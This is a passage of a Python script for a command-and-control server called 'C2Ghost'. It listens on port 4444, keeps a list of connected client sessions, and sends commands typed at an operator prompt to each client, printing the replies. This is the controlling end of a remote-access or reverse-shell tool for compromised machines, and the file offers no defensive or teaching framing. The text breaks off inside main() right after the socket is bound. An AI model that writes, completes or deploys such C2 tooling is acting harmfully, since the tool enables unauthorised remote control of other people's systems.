#!/usr/bin/env python3

import socket
import threading

BIND_IP = "0.0.0.0"
BIND_PORT = 4444

clients = {}
client_id = 0

def handle_client(client_socket, address, id):
    print(f"[+] Client {id} connected from {address[0]}:{address[1]}")
    client_socket.send(b"Welcome to C2Ghost Server\n")
    try:
        while True:
            cmd = input(f"C2Ghost[{id}]> ").strip()
            if cmd.lower() == "exit":
                print(f"[-] Closing session {id}")
                client_socket.send(b"exit")
                break
            elif cmd.lower() == "list":
                print("[*] Active sessions:")
                for cid, addr in clients.items():
                    print(f"Session {cid}: {addr}")
            else:
                client_socket.send(cmd.encode())
                response = client_socket.recv(4096).decode()
                print(response)
    except Exception as e:
        print(f"[!] Connection lost with {id}: {e}")
    finally:
        client_socket.close()
        del clients[id]
        print(f"[-] Session {id} terminated.")

def accept_connections(server):
    global client_id
    while True:
        client_socket, addr = server.accept()
        client_id += 1
        clients[client_id] = addr
        client_thread = threading.Thread(target=handle_client, args=(client_socket, addr, client_id))
        client_thread.start()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((BIND_IP, BIND_PORT))
    server

